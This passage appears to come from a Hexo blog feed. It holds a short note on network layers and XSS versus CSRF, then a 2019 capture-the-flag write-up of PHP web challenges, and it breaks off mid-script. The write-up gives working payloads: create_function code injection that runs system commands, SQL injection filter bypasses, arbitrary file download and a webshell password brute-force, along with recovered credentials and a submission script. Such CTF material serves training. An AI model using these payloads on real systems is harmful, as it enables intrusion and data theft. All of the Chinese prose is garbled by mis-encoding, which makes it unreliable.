https</p><p><strong>ä¸ƒå±‚æ¨¡å‹ç»“æ„</strong><br>åº”ç”¨å±‚ http ftp  dns<br>è¡¨ç¤ºå±‚ è¿›è¡Œ è§£ç ä¸ç¼–ç  åŠ å¯†è§£å¯†<br>ä¼šè¯å±‚ éªŒè¯ç”¨æˆ·  æ–­ç‚¹ç»­ä¼ <br>ä¼ è¾“å±‚ tip udp å»ºç«‹è¿æ¥<br>ç½‘ç»œå±‚ ip è¿›è¡Œé€‰è·¯<br>æ•°æ®é“¾è·¯å±‚<br>ç‰©ç†å±‚</p><p><strong>XSS å’Œ CSRF çš„åŒºåˆ«ï¼Ÿ</strong><br>XSSï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ³¨é‡çš„æ˜¯è„šæœ¬ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œåƒä»€ä¹ˆåä»€ä¹ˆ æœ‰è„šæœ¬çš„å‚ä¸ï¼Œé»‘å®¢æ„é€ å¥½å„ç§å„æ ·åŠŸèƒ½çš„è„šæœ¬è®©ä½ æ¥è§¦å‘ã€‚</p><p>CSRFï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ³¨é‡çš„æ˜¯è·¨ç«™ï¼Œä¼ªé€ ï¼Œä¹Ÿå°±æ˜¯è¯´é‡ç‚¹åœ¨å€Ÿåˆ€æ€äºº å€Ÿä½ çš„æ‰‹è§¦å‘æŸäº›æ“ä½œã€‚</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>2019å¹´æ˜å®‰æ¯writeup</title>
      <link href="/2019/04/08/2019%E5%B9%B4%E6%8E%98%E5%AE%89%E6%9D%AFwriteup/"/>
      <url>/2019/04/08/2019%E5%B9%B4%E6%8E%98%E5%AE%89%E6%9D%AFwriteup/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $action = $_GET[<span class="string">'action'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $arg = $_GET[<span class="string">'arg'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action($arg,<span class="string">''</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯Pç¥ä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œä½†æ˜¯è¢«æ”¹åŠ¨äº†å‚æ•°çš„ä½ç½®<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vguehe0fj30us0chwgc.jpg" alt=""><br>create_functionæ³¨å…¥åˆ†æï¼š</p><p><a href="https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/">https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/</a><br>åœ¨è¿™é“é¢˜ä¸­ï¼Œå¯æ§çš„æ˜¯ç¬¬äºŒä¸ªå‚æ•° é€šè¿‡åŠ ä¸Š â€˜)â€™ é—­åˆæ¥è¿›è¡Œæ³¨å…¥<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">action</span>=%5ccreate_function&amp;arg=)&#123;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vgxu71q7j30xc0e8go2.jpg" alt=""><br>æ¥ä¸‹åªéœ€æ”¹å˜phpinfo();ä»£ç è¿›è¡Œæ³¨å…¥å³å¯<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(scandir(<span class="string">'../'</span>));/*</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh31m698j30rl0fct9d.jpg" alt=""><br>å‘ç°è¿™é“é¢˜æ²¡æœ‰æƒ³pç¥é‚£é“é¢˜ä¸€æ ·ç¦ç”¨system()å‡½æ•°<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=)&#123;&#125;print_r(<span class="keyword">system</span>(<span class="keyword">ls</span>));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh2l1yc4j30py06r3yn.jpg" alt=""></p><p>æ¥ä¸‹æ¥è¯»å–å†…å®¹<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(include<span class="meta">%20Th1s_1S_F1a9_Hav3_Fun</span>);/*</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh7tb46lj30y90bp74q.jpg" alt=""></p><h1 id="ä¸‹è½½ä¸‹è½½"><a href="#ä¸‹è½½ä¸‹è½½" class="headerlink" title="ä¸‹è½½ä¸‹è½½"></a>ä¸‹è½½ä¸‹è½½</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhbz8twbj30ks07vglt.jpg" alt=""><br>å‘†å‘†åœ°ç‚¹å‡»ä¸‹è½½ å¦‚æœå‘ç°æ²¡æœ‰flag~<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhd1ml6rj30ik07wq33.jpg" alt=""><br>æŸ¥çœ‹æºç  å‘ç°æœ‰flag.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhej7juuj30lc07qt8p.jpg" alt=""><br>ä»€ä¹ˆä¹Ÿæ²¡æœ‰ äºæ˜¯å›è¿‡å¤´çœ‹ä¹‹å‰çš„æºç  æ˜¯å¦èƒ½å¤Ÿä¸‹è½½flag.php æˆ–è€…æ˜¯ä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>ä¸‹è½½flag.phpæˆåŠŸ å†…å®¹å¦‚ä¸‹</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>); <span class="regexp">//</span>ç½‘é¡µç¼–ç </span><br><span class="line">function encrypt($data, $key) &#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= $key &#123;$x&#125;;</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">$str .= <span class="keyword">chr</span> ( <span class="keyword">ord</span> ( $data &#123;$i&#125; ) + (<span class="keyword">ord</span> ( $char &#123;$i&#125; )) % <span class="number">256</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decrypt($data, $key) &#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$data = base64_decode ( $data );</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= <span class="keyword">substr</span> ( $key, $x, <span class="number">1</span> );</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) &lt; <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) )) &#123;</span><br><span class="line">$str .= <span class="keyword">chr</span> ( (<span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) + <span class="number">256</span>) - <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$str .= <span class="keyword">chr</span> ( <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) - <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=<span class="string">"MyCTF"</span>;</span><br><span class="line">$flag=<span class="string">"o6lziae0xtaqoqCtmWqcaZuZfrd5pbI="</span>;<span class="regexp">//encrypt</span>($flag,$key)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æœ‰encrypt() decrypt() ä¸¤ä¸ªå‡½æ•° åˆ†åˆ«æ˜¯åŠ å¯†å’Œè§£å¯†å‡½æ•°<br>åœ¨æœ€ä¸‹é¢flag æ˜¯è¢«åŠ å¯†è¿‡äº† åˆå› ä¸ºæœ‰è§£å¯†å‡½æ•°ï¼Œäºæ˜¯ç›´æ¥è°ƒç”¨è§£å¯†å‡½æ•°å³å¯<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhopg4bij30zt0fu0uk.jpg" alt=""></p><h1 id="è¯¥ç½‘ç«™å·²è¢«é»‘"><a href="#è¯¥ç½‘ç«™å·²è¢«é»‘" class="headerlink" title="è¯¥ç½‘ç«™å·²è¢«é»‘"></a>è¯¥ç½‘ç«™å·²è¢«é»‘</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhqd2rcoj30w20hotbv.jpg" alt=""><br>ä¸€ä¸ªç‚«é…·çš„ç½‘é¡µ è¢«é»‘ï¼Ÿ äºæ˜¯æ‹¿å¾¡å‰‘æ‰«ä¸€ä¸‹ å‘ç°shell.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhrguismj30sj0craaa.jpg" alt=""><br>éœ€è¦å¯†ç <br>ç”¨burpå¯¼å…¥å­—å…¸è¿›è¡Œæš´åŠ›å¾—åˆ°å¯†ç ä¸ºhack<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vilesi7kj30il09emx7.jpg" alt=""></p><h1 id="æ›²æŠ˜çš„äººç”Ÿ"><a href="#æ›²æŠ˜çš„äººç”Ÿ" class="headerlink" title="æ›²æŠ˜çš„äººç”Ÿ"></a>æ›²æŠ˜çš„äººç”Ÿ</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vimr76ubj30x60gx3zj.jpg" alt=""><br>éšä¾¿è¾“ä¸€ä¸‹ å‘ç°æœ‰æœ‰å›æ˜¾<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vincefsuj30rt0bqq3o.jpg" alt=""><br>æ¥ä¸‹æ¥ç”¨unionæ³¨å…¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vjm38ucij30yt07z3zn.jpg" alt=""><br>å…¶ä¸­:</p><ol><li>ç©ºæ ¼è¢«è¿‡æ»¤  ç”¨ <code>/**/</code>  ç»•è¿‡</li><li>union,select å…³é”®å­—è¢«è¿‡æ»¤      åŒå†™ç»•è¿‡</li></ol><p>å¾—åˆ°è´¦å·å¯†ç <br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·å<span class="symbol">:goodboy_g-</span><span class="number">60</span>Hellowor</span><br><span class="line"></span><br><span class="line">å¯†ç ï¼šajahas&amp;&amp;*<span class="number">44</span>askldajaj</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥ç¼–å†™è„šæœ¬æäº¤</p><p>å¾—åˆ°sss88ioiern.gdsgj.zip<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkcxr20qj30j205bt8v.jpg" alt=""><br>from1.txtæ˜¯ç”¨VBå†™çš„ä»£ç   è½¬æ¢ä¸ºpytohnä»£ç ä¸º:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def getPassword(string):</span><br><span class="line"><span class="built_in">i</span> = <span class="number">1</span></span><br><span class="line">reString = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">i</span> &lt;= len(string) :</span><br><span class="line">reString = reString + string[<span class="built_in">i</span><span class="number">-1</span>]</span><br><span class="line"><span class="built_in">i</span> = <span class="built_in">i</span> + (<span class="built_in">i</span> <span class="comment">% 5)</span></span><br><span class="line"><span class="keyword">return</span> reString</span><br><span class="line"></span><br><span class="line">Dictionary = <span class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line"></span><br><span class="line">password = getPassword(Dictionary)</span><br><span class="line">password = getPassword(password)</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkscaoy0j30th04udg3.jpg" alt=""><br>å¾—åˆ°è§£å‹å¯†ç <br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkug6lydj30n0052wes.jpg" alt=""></p><h1 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$str1 = @$_GET[<span class="string">'str1'</span>];</span></span><br><span class="line"><span class="php">$str2 = @$_GET[<span class="string">'str2'</span>];</span></span><br><span class="line"><span class="php">$str3 = @$_GET[<span class="string">'str3'</span>];</span></span><br><span class="line"><span class="php">$str4 = @$_GET[<span class="string">'str4'</span>];</span></span><br><span class="line"><span class="php">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span></span><br><span class="line"><span class="php">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span></span><br><span class="line"><span class="php">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_POST[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b = $_POST[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php">$m = $_GET[<span class="string">'m'</span>];</span></span><br><span class="line"><span class="php">$n = $_GET[<span class="string">'n'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str8 = hash(<span class="string">'md5'</span>, $a, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$str9 = strtr(hash(<span class="string">'md5'</span>, $b, <span class="keyword">false</span>), $m, $n);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str8 : $str8&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str9 : $str9&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">6</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"You're great,give you flag:"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆ<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæ˜¯md5å¼±ç±»å‹æ¯”è¾ƒï¼Œå¯ç”¨æ•°ç»„æ¥ç»•è¿‡<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str1<span class="string">[]</span>=<span class="number">1</span>&amp;str2<span class="string">[]</span>=<span class="number">2</span>&amp;str3<span class="string">[]</span>=<span class="number">3</span>&amp;str4<span class="string">[]</span>=<span class="number">4</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbfr0k1zj30ra0j3mxx.jpg" alt=""></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str5 == $str6 <span class="params">||</span> $str5 == $str7 <span class="params">||</span> $str6 == $str7 )&#123;</span><br><span class="line">    die(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($str5) !== md5($str6) <span class="params">||</span> md5($str6) !== md5($str7) <span class="params">||</span> md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨äº†stringè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæˆ‘ä»¬æ— æ³•ç”¨æ•°ç»„ç»•è¿‡äº†ã€‚åªèƒ½ç”¨MD5å¼ºç¢°æ’ï¼Œè¦æ±‚ä¼ å…¥ä¸‰ä¸ªå€¼ä¸èƒ½ç›¸ç­‰ï¼Œä½†æ˜¯MD5ç›¸ç­‰<br>å‚è€ƒ:<a href="https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html</a><br>å°†è¿™ä¸‰ä¸ªå›¾ç‰‡æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼ŒæŸ¥çœ‹md5å€¼<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbl3nu9aj30i703tq35.jpg" alt=""><br>ä¹Ÿå¯ä»¥ç”¨å·¥å…·ï¼›python-md5-collision æ¥è¿›è¡Œç”Ÿæˆ<br>å·¥å…·ä¸‹è½½åœ°å€:<br><a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">https://github.com/thereal1024/python-md5-collision</a><br>æ¥ä¸‹æ¥ç”¨pythonæ¥æäº¤ï¼Œè„šæœ¬å¦‚ä¸‹:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'str5'</span>: <span class="built_in">open</span>(<span class="string">'black.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str6'</span>: <span class="built_in">open</span>(<span class="string">'brown.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str7'</span>: <span class="built_in">open</span>(<span class="string">'white.jpg.coll'</span>).<span class="built_in">read</span>()</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line"><span class="built_in">print</span> r.<span 